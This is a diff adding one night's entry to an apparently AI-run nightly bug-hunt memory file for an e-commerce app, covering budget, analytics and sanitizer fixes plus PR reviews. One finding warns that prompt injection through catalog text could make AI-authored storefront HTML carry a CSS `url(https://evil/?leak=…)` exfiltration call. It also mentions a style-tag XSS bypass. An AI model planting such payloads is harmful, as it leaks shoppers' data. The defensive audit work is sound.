@@ -3,6 +3,140 @@
 Long-lived brain for the unattended nightly run. Records false positives (do NOT
 re-flag), recurring bug patterns, fixes that worked, and gate/CI gotchas.
 
+## 2026-07-07
+
+### Triage — 96 commits (`c11d629`..`3a2f3af`); a GENUINE companion nightly PR #353 existed
+Big feature batch: **weather-reallocation** (brand-new money path — forecast-driven ad-budget moves), storegen
+AI-authored HTML pipeline, go-live cutover **test-transaction** probe, migrated-Shopify **analytics folding**,
+Orders-view rewrite (merge imported orders), asset-rehost sweep, Autopilot explainable action cards. Fanned out
+**5 read-only bug-hunters** (weather money path · storegen HTML/security · orders+commerce · autopilot+payment/
+cutover · assets/import/oauth/misc) + **2 open-PR reviewers** (#351, #352). **4 real landed bugs fixed** →
+**PR #354** (draft), branch `fix/nightly-2026-07-07`, commits `16b4dbb` · `bd2e300` · `d478fde` · `0ed7ca6`.
+
+- **Companion nightly PR #353 (author Mezoh, base == our main `3a2f3af`) was GENUINE** — 6 fixes, all verified
+  correct: commerce.server test-probe `channel='test'` exclusion + imported-refund keyed to parent-order window
+  + native-only per-day conversion; rehost paged sibling read (1000-clamp) + attempts-bump on post-store update
+  failure; sanitize-html `</style/` (solidus/whitespace-terminated) parser-differential XSS + scope @import/
+  expression strip to `<style>` blocks; open-meteo skip a location missing the daily series; NULL narrative→"";
+  customers loader degrades weather to empty. Posted **NONE** and hunted for what #353 MISSED (found bugs #3, #4
+  below that #353's `orders`-table-only channel fix does not reach).
+
+### Bug #1 fixed — weather budget DOUBLE-MOVE on apply-retry (money path)
+- **`app/routes/dashboard.api.weather-reallocation.tsx`** (`bd3d3bd`/#343). `executeReallocation` reduces the
+  source + raises the dest budget ON-PLATFORM (reallocate.server.ts:122-149) BEFORE `insertAuditWithIdempotency`
+  writes the `action_idempotency` row. If the `action_audit` insert throws (`iErr`, execute.server.ts:186 — a
+  Supabase blip), the budget is already moved but NO idempotency record exists; the route's `catch` released the
+  row to `pending` → merchant re-approval re-claims, `priorExecutionForKey` finds nothing → budget moved AGAIN.
+  Fix: catch → `setStatus("failed")` (matching the `outcome==='failed'` branch); next cron re-suggests.
+- **Lesson (mutate-then-record ordering):** any executor whose idempotency marker is written AFTER the external
+  side effect must treat a POST-MUTATION throw as TERMINAL, not retryable. An error handler that "releases back
+  to pending / retryable" on a blanket catch double-executes when the throw lands between the mutation and the
+  idempotency write. Same family as a partial-failure retry, at the executor↔route seam.
+
+### Bug #2 fixed — weather move funded from a region with NO forecast
+- **`app/lib/actions/weather-suggest.server.ts`** `buildSuggestion` (`a2baf26`/#343). Ranked every campaign
+  region by `scores.get(r) ?? 0`; a region with eligible campaigns but no forecast entry (Open-Meteo returned
+  fewer locations, or — post-#353 — the location was skipped for a missing daily series) defaulted to score `0`
+  (the minimum) → chosen as the SOURCE whose budget is cut, moving real money on a forecast we don't have.
+  `scores` is built only from `forecasts`; `byRegion` from campaigns — they can diverge. Fix: `filter(r =>
+  scores.has(r))` before ranking, re-check the ≥2 minimum. Also surfaced a swallowed `guardrail_config` read
+  error (cron isolates per-shop via mapWithConcurrency, so throwing fails just that shop).
+- **Lesson (`map.get(x) ?? DEFAULT` where DEFAULT is a meaningful extreme):** `?? 0` conflates "missing" with
+  "genuinely lowest" — a decision keyed on the value silently acts on ABSENT data as if it were the worst case.
+  Filter to keys actually present before ranking/deciding. Note #353's open-meteo skip made this MORE reachable.
+
+### Bug #3 fixed — uncaptured migrated orders inflate analytics window totals
+- **`app/lib/analytics/commerce.server.ts`** `readWindowImportedOrders` (`5843300`/#347). Folded EVERY
+  `imported_order` in the window (only a `processed_at` filter) into gross / per-day gross / order count / the
+  Shopify channel total, while the NATIVE reader restricts to `SALE_STATES`. `imported_order.financial_status`
+  carries Shopify vocab incl. `pending`/`authorized`/`voided`/`expired` (money never captured; all enumerated in
+  Orders.tsx `IMPORTED_STATUS`) → counted as revenue with no offsetting sale. Fix: `.in("financial_status",
+  ["paid","partially_paid","partially_refunded","refunded"])` + stable `.order("id")` tiebreak (pagination across
+  the 1000-clamp). #353 also edits this reader (adds `id` to select) — non-conflicting hunks.
+- **Lesson (folding a 2nd source into a native aggregate):** every filter the native side applies (sale-state,
+  channel, stable tiebreak) MUST be mirrored for the imported/migrated source in ITS OWN vocabulary. A dropped
+  status filter on the newly-folded source silently overstates the combined total.
+
+### Bug #4 fixed — go-live TEST PROBE leaks into warehouse revenue
+- **`app/lib/order/emit.server.ts`** `emitPaidOrder` (`1b75d98`/#339). The 50c cutover probe is a real
+  `channel='test'` order that reaches `paid` then is refunded. `channel` exists ONLY on `orders`, NOT on
+  `order_fact`; #353's `channel='test'` commerce-analytics exclusion operates on `orders` and can't reach the
+  emitted `order_fact` row → probe permanently inflates warehouse revenue / order count / AOV (refund emits a
+  `refund_fact` but leaves the `order_fact` row). Fix: `emitPaidOrder` selects `channel`, early-returns skipped
+  for test orders (mirrors the existing state!='paid' self-heal skip).
+- **Lesson (a "test/synthetic" flag on ONE table doesn't propagate to derived tables):** an exclusion built on a
+  flag only covers the table that HAS the flag. When a probe/test row rides the real checkout→webhook→emit path,
+  audit EVERY downstream consumer keyed off derived tables (`order_fact` revenue, `buyer_dim` count) — #353 fixed
+  the `orders`-based commerce view but NOT `order_fact` (bug #4) or `buyer_dim` (surfaced below).
+
+### Found but NOT auto-fixed (surfaced in PR #354 for a maintainer call) — act on these if they recur
+- **Public-storefront CSP has NO resource directives** (`app/entry.server.tsx`, non-embedded branch): only
+  `frame-ancestors/object-src/base-uri/form-action/upgrade-insecure-requests` — no `default-src`/`img-src`/
+  `style-src`/`connect-src`. The HTML sanitizer intentionally passes CSS `url()` through, justified by a comment
+  claiming it's "blocked by the storefront CSP" — that is FALSE. AI-authored storefront HTML is grounded in
+  untrusted catalog text + merchant brief (prompt-injection surfaces), so a coerced `url(https://evil/?leak=…)`
+  is a client-side exfil/tracking channel with no net. **Why not fixed:** a CSP tightened without the storefront's
+  legit resource origins (rehosted Supabase images, fonts) could break the public storefront for all merchants —
+  needs a runtime-verified allowlist. **Lesson: when a sanitizer defers a vector "to the CSP", verify the CSP
+  actually carries that directive.**
+- **Go-live probe also inflates `buyer_dim`** (`app/lib/cutover/test-transaction.server.ts`): `upsertGuestBuyer`
+  writes a real `buyer_dim` row (`test-probe@calderyn.internal`); the buyer directory counts it with no channel
+  filter and `refundTestOrders` never removes it → permanent phantom customer. Same root as bug #4. Product call.
+- **Orders "of N" total mixes counts** (`Orders.tsx`): `ordersTotal = native(capped 100) + imported.totalCount`
+  undercounts once native > 100. Needs a native `count()` query (UX decision), not surgical.
+- **Storegen `<style>` selector scoping not enforced** (defense-in-depth) — non-trivial CSS-scope rewrite.
+
+### False positives cleared this run (do NOT re-flag)
+- **Autopilot explainable action cards (#348):** `money()` takes cents; `rowToAlert` converts DB dollars→cents at
+  the boundary; the money verb is cosmetic framing over a positive magnitude (no sign/direction error);
+  `reasonLines` never hides a real reason; the approve path is unchanged (JSX-only diff) + guarded. Clean.
+- **Assets rehost (beyond #353's 2 fixes):** dedup-before-rehost ordering correct; `(product_id, external_url)`
+  partial unique prevents identical-hotlink double-rehost; `storeImageBytes` removes its blob if `asset_dim`
+  insert fails. Clean.
+- **Import protected-customer-data denial (#337):** the `pulling` flag scopes the broadened `blocked` classifier
+  to the customer pull ONLY; a genuine token revocation throws earlier in `backfillShop`; run marked `done` with
+  an honest "customers not-yet-available" report (documented intent, not hidden partial-success). Clean.
+- **OAuth shop-less restore (#335):** callback still enforces HMAC + nonce + valid shop + code exchange; the `*`
+  sentinel only relaxes the shop-pin; `__Host-` state cookie host-locked (anti-fixation); `return_to`
+  re-sanitized via `safeDashboardReturnTo`. No bypass/CSRF/open-redirect. Clean.
+- **AI-quota dev/allowlist bypass (#340):** `NODE_ENV==='development'` can't fire in Vercel prod or vitest;
+  allowlist exact trimmed match, empty env = every shop capped. Fail-safe. Clean.
+- **Discover subtab (#329):** `requireSameOrigin` + `requireDashboardSession`, shop from `session.shopId`. Clean.
+- **`checkout.session.completed` reconcile (stripe.server.ts):** only upserts `payment_intent` (onConflict), no
+  ledger/count, redelivery = pure no-op; the money-moving `payment_intent.succeeded` path stays dedup-gated on
+  `record_stripe_event`. New cutover route auth is `requireSameOrigin`+`requireDashboardSession`, shop from
+  session. Clean.
+- **Storegen sanitizer/levers (beyond #353):** no bypass beyond the fixed `</style/`; `typeStyle`/`density`
+  whitelisted with safe defaults at every boundary (parseBrandPlan, getStoreSettings, render re-default); every
+  rawHtml write sanitized (saveDraft, generator double-sanitize, experiment `variant_doc`); no `.server` leak
+  into `Store.tsx`; 0-product path guarded (`skipLlm`/`fallbackDoc`). Clean.
+- **PR #352 (weather segments v2 — unattended armed predictions):** armed exec atomically claims the row before
+  any budget move; `idempotencyKey weather:${row.id}` shared with the manual path; disarm vs claim are mutually
+  exclusive conditional updates; alerts-mirror select-then-insert avoids ON-CONFLICT-against-partial-index 42P10.
+  Reviewed money path end-to-end → NONE.
+
+### Open-PR review this run
+- **#351** (last-mile merchant-flow fixes, author Mezoh): posted ONE comment — the update path still writes the
+  flat `inventory_on_hand` for an EXISTING variant WITHOUT reaching the ledger (`seedInitialStock` only in the
+  new-variant branch), so now that the ledger is authoritative for sellability, the editor's editable stock field
+  silently does nothing. The 3 fixes themselves are sound (C2 `inventory_adjust` absolute upsert = no inflation;
+  C3 recommendation narrowing; M6 `org_slug` threading).
+- **#352** (weather segments v2): NONE (see above). **#353** (companion nightly): 6 fixes correct → NONE.
+
+### Gate / environment
+- `npm ci` exit 0, Node v22.22.2. Full gate on fix tree (`0ed7ca6`): setup 0 · typecheck 0 · lint 0 (touched,
+  `--max-warnings=0`) · build 0 (verifier: **252** client files clean) · vitest **589 files / 4345 passed / 12
+  skipped / 0 failed**.
+- **NEW — CI is RED on `main` itself:** the GitHub Actions **`CI`** workflow (jobs **`Node gate`** + **`Python
+  engine tests`**) fails on EVERY recent main commit including the tip `3a2f3af` (our base), with EMPTY output +
+  **404** job logs → the runner isn't actually executing (env/secrets/self-hosted-runner issue, not code). Do NOT
+  treat a red CI on the nightly PR as a regression — it's red on main too. Rely on the LOCAL gate (authoritative).
+  Diagnose pre-existing-ness via `actions_list list_workflow_runs {branch:"main"}` and compare conclusions.
+  Documented on PR #354; did NOT re-kick (no code fix turns a runner-infra failure green).
+- `gh` CLI NOT available — use GitHub MCP (`mcp__github__*`). `get_job_logs` 404s and `get_check_run` returns
+  empty output for these failing jobs. Vercel bot: routine Building→Ready preview-deploy comment (no action).
+
+
 ## 2026-07-06
 
 ### Triage — 38 commits since last night's base `89059ad`; a GENUINE companion nightly PR #326 existed
